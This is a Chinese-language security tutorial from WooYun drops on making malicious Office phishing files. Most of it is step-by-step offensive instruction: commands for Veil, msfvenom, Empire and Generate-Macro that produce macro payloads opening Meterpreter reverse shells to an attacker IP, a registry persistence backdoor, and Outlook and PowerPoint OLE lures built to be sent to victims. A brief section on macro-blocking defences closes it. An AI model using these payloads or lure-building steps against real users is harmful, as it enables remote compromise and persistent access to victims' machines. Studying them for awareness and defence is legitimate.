# Office Phishing

![Alt text](http://drops.javaweb.org/uploads/images/90d42f294e85024835ae71639a1f64b68af02f7b.jpg)

Office作为Windows平台下一种非常流行的办公软件，越来越多的APT攻击通过构造恶意Office文件来进行实施，这也是成功率也是比较高的一种攻击方式。当然最隐蔽，最有效的攻击方式就是通过Office办公套件的一些0day来实施攻击，但是这也同样存在一些弊端，首先不是所有人都拥有0day，其次那些已经公布的Xday可能只能针对某些固定版本的Office，所以本文重点不在如果使用Xday，而是对现在已知的一些构造Office Phishing File的方式及方法进行总结，希望对学习Hack的同学有所帮助，当然也希望，通过此文，小伙伴能避免遭受此类攻击。

`以下测试均在安装某安全卫士的Win10上面进行。`

0x00 Office 宏
=============

* * *

宏是微软公司为其OFFICE软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具，它利用简单的语法，把常用的动作写成宏，当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。但是宏在提供方便的同时，也存在很大的风险，其危害在Freebuf上也有过相关文章：[《MWI-5：利用Office宏下载键盘记录器的攻击活动分析》](http://www.freebuf.com/vuls/82511.html)，下文将会介绍几个知名工具构造宏后门的方式。

### 1、 Veil

测试使用powershell/shellcode_inject/virtual，选择以后直接generate

![Alt text](http://drops.javaweb.org/uploads/images/7d0268ba03588426e790a0eaf4930bc34e62f8f4.jpg)

随便输入一个名字之后成功生成：

![Alt text](http://drops.javaweb.org/uploads/images/64f0b837b6ce3dbbcd22abedcb61e1d13694460c.jpg)

然后需要下载一个转换脚本：

```
☁  office  git clone https://github.com/khr0x40sh/MacroShop.git

```

使用下载的python脚本转换为VBA脚本：

```
root@kali:~/script/MacroShop# python macro_safe.py /usr/share/veil-output/source/test.bat

```

![Alt text](http://drops.javaweb.org/uploads/images/f54c242024ebae586db0659a3476b7881f257f99.jpg)

之后将生成的内容添加到OFFice文件宏里面。创建宏，`注意选择宏的位置`为当前文档:

![Alt text](http://drops.javaweb.org/uploads/images/ba98e908dbea457695899b6516581e010ef20fd1.jpg)

接下来选择Project 下面的Microsoft Word对象，选择Document->open,然后将生成的代码粘进去。要保存的代码如下图

> 这里注意一点，脚本生成的默认是打开表格的宏，所以，这里只要函数内容，注意打钩的。

![Alt text](http://drops.javaweb.org/uploads/images/a1d84e78c864f562ceb1b7402b26ed83c1f69045.jpg)

之后保存为启用宏的Word文档或者doc文档。

开启监听：

```
root@kali:~/Veil-Evasion# msfconsole -r /usr/share/veil-output/handlers/test_handler.rc

```

打开word文档会有此提示：

![Alt text](http://drops.javaweb.org/uploads/images/e1ed040a3c4544c6fe1115fb4a794332184cd872.jpg)

点击启用，则生成meterpreter会话。

![Alt text](http://drops.javaweb.org/uploads/images/3ed07fd6f28cd74defb26dc88759213811893891.jpg)

### 2、 Nishang

nishang的使用早在[《使用powershell Client进行有效钓鱼》](http://drops.wooyun.org/tips/8568)有所介绍，有兴趣的小伙伴可以再去看看。

### 3、 Metasploit

作为一个神器，Msf当然也可以生成VBA的后门文件，具体命令如下：

```
☁  ~  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.100 lport=8888 -e x86/shikata_ga_nai exitfunc=thread -f vba > vcode.txt

```

### 4、 Empire

```
(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > execute
(Empire: listeners) > usestager macro
(Empire: stager/macro) > set Listener test
(Empire: stager/macro) > set OutFile /tmp/macro.txt
(Empire: stager/macro) > execute

[*] Stager output written out to: /tmp/macro.txt

```

将代码写入宏，执行可成功返回会话：

![Alt text](http://drops.javaweb.org/uploads/images/3413bfae9c158b22b1a9ec64509acb13234e0e38.jpg)

### 5、 Scripts

```
☁  office  git clone https://github.com/enigma0x3/Generate-Macro.git

```

使用方式如下：

```
PS C:\Users\Evi1cg\Desktop> . .\Generate-Macro.ps1
Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version): https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-Shellcode.ps1
Enter IP Address: 192.168.2.111
Enter Port Number: 6666
Enter the name of the document (Do not include a file extension): Macro

--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Alternate Data Stream Persistence
4. Meterpreter Shell with Scheduled Task Persistence
------------------------------
Select Attack Number & Press Enter: 1

--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Number & Press Enter: 2
Saved to file C:\Users\Evi1cg\Desktop\Macro.xls
Clean-up Script located at C:\Users\Evi1cg\Desktop\RegistryCleanup.ps1

```

![Alt text](http://drops.javaweb.org/uploads/images/0257ed6ac28ce6e8844a83b21223721cff835c9b.jpg)

运行Excel以后则生成meterpreter会话：

![Alt text](http://drops.javaweb.org/uploads/images/29b1771580762a320f39ab07bfc64adac0088bf5.jpg)

同时生成自启动后门：

![Alt text](http://drops.javaweb.org/uploads/images/b84238921e158e8f69e01c62c492b82cb300e6b7.jpg)

> 具体键值为`HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load`

清除后门可以使用如下命令：

```
PS C:\Users\Evi1cg\Desktop> . .\RegistryCleanup.ps1
[*]Successfully Removed config.vbs from C:\Users\Public
[*]Successfully Removed Malicious Load entry from HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows
[!]Path not valid
[!]Path not valid

```

具体其他后门的使用，有兴趣的小伙伴可是自己实践一下。

其他Macro后门相关的脚本如下：

*   [Old-Powershell-payload-Excel-Delivery](https://github.com/enigma0x3/Old-Powershell-payload-Excel-Delivery)
*   [OutlookPersistence](https://github.com/enigma0x3/OutlookPersistence)
*   [exe2vba.rb](https://raw.githubusercontent.com/OpenWireSec/metasploit/master/tools/exe2vba.rb)
*   [unicorn](https://github.com/trustedsec/unicorn.git)

0x01 Office OLE
===============

* * *

OLE是Object Linking and Embedding的缩写，即“对象链接与嵌入”，这是一种把一个文件的一部分嵌入到另一个文件之中的技术，此类攻击方式也被常常应用于APT中，其有一个好处就是不需要用户开启宏，及在禁用宏的情况下执行命令。

### 1、 Outlook OLE

@三好学生 之前在Zone里面曾经有一个介绍：[Outlook OLE 钓鱼邮件利用介绍](http://zone.wooyun.org/content/24657)，本人在win10+offcie2016下作了测试，在这里做一下简单的介绍，制作此钓鱼文件步骤如下：

1.  新建邮件，在设置文本格式处选择RTF：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/a7590931e0f5819905969594029a00fe6466eeaf.jpg)
    
2.  选择插入->对象->Package，选择显示为图标：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/c6a30ef1832d2b9f1a2f0844c565a1200fc76ce7.jpg)
    
3.  然后将图标换为Word图标，并修改题注为迷惑性名称：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/501d761baf5e59916c3fea6fa7635a32938ff4b3.jpg)
    
4.  绑定指定程序或脚本；
    
5.  将RTF再改为HTML ；
    
6.  添加其他迷惑内容 ：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/2d811182f5f7382dec4c5c129e06af7726beb2c4.jpg)
    
7.  保存为test.msg ；
    
8.  发送给受害者。
    

受害者运行以后会有以下提示：

![Alt text](http://drops.javaweb.org/uploads/images/a409a99942b299c7dad2b36f7e1aa67985734d9f.jpg)

点击是以后会弹：

![Alt text](http://drops.javaweb.org/uploads/images/27a5b36c8f3a09f9e7e9f1bef8e287ee605820c3.jpg)

点击打开，成功执行：

![Alt text](http://drops.javaweb.org/uploads/images/84173529b6d1b3e6573983f2e73da43bcc3ec492.jpg)

### 2、 PowerPoint OLE

通过PowerPoint演示文稿进行Phishing，同样不需要启用宏，制作步骤如下：

1.  创建新的PowerPoint文件；
2.  创建VBS脚本，为了简单演示，只写了一个弹框：
    
    ```
    Msgbox("test")
    
    ```
3.  将VBS拖入PPT；
    
4.  为VBS添加动画->OLE操作动作并选择激活，如下图：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/f7864b55b5d7bbc481fafd93d42814d0f8d678c9.jpg)
    
5.  选择动画窗格->效果选项：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/6e7426ab9e2cf67be1ef33090627a0aa0eb47d56.jpg)
    
6.  选择计时->与上一动画同时：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/3d3aa52af166d6e4eb342f2087ec977a660486b7.jpg)
    
7.  为PPT添加内容；
    
8.  另存为放映文件pps或者ppsx；
    
9.  发送给受害者。
    

受害者打开会弹出如下提示框：

![Alt text](http://drops.javaweb.org/uploads/images/7bd6699c844005a5be4551a33691e20dfc9f8569.jpg)

点击打开，执行脚本。

对于VBS后门，本文就不再详细描述怎么制作了，很多姿势小伙伴们可以自己搜集一下，比较好玩儿的请参考:[JavaScript Phishing](http://drops.wooyun.org/tips/12386)

对于VBS脚本可以使用这个脚本来进行加密：[ncode-and-Decode-a-VB](https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c)

0x02 防御
=======

* * *

关于通过Office宏或者OLE对象进行的攻击从90年代开始了，然而现在还在利用中，如何更好地防御此类攻击呢？

1.  你可以教育你的员工不要点启用宏，不要随便乱点确定，不要随便下载不明文件等。
2.  配置组策略，如果在域下，可以批量配置管理模板。
    
    ![Alt text](http://drops.javaweb.org/uploads/images/fcf759c667a03981d93ce42cce6a706edfab8e64.jpg)
    
    设置 Disable all except digitally signed macros：
    
    ![Alt text](http://drops.javaweb.org/uploads/images/7720b3c510daa4798a8664a5e867917c6eb7ff98.jpg)
    
    > 更多细节请看[这里](https://technet.microsoft.com/en-us/library/cc179039.aspx)
    
3.  对于.msg、.rtf、.pps 后缀的文件要格外注意；
    
4.  采用EMET，如果你不知道EMET是什么，可以[看这里](https://www.microsoft.com/en-us/download/details.aspx?id=50766&WT.mc_id=rss_windows_allproducts)。
    

> 以上方法来自于[it-s-time-to-secure-microsoft-office](https://medium.com/@networksecurity/it-s-time-to-secure-microsoft-office-be50ec2797e3#.612sh3mlk)，关于规划Office的VBA宏的安全设置请看[这里](https://msdn.microsoft.com/zh-cn/magazine/ee857085(office.15).aspx)。

0x03 小结
=======

* * *

使用Office进行APT攻击的情形越来越多，在没有0day的情况下，我们应该至少对于以上类型的钓鱼攻击进行了解及防范，以上为个人所了解的几种构造Office钓鱼文件的方式，可能并不全面，如果小伙伴还有别的姿势，请不吝赐教。

0x04 参考
=======

* * *

*   [http://phishme.com/powerpoint-and-custom-actions/](http://phishme.com/powerpoint-and-custom-actions/)
*   [http://zone.wooyun.org/content/24657](http://zone.wooyun.org/content/24657)
*   [https://medium.com/@networksecurity/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0#.92vne7zgd](https://medium.com/@networksecurity/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0#.92vne7zgd)
*   [https://www.youtube.com/watch?v=xm4PwyPCacw](https://www.youtube.com/watch?v=xm4PwyPCacw)
*   [https://www.youtube.com/watch?v=j0CnVokavtI](https://www.youtube.com/watch?v=j0CnVokavtI)

**本文由evi1cg原创并首发于乌云drops，转载请注明**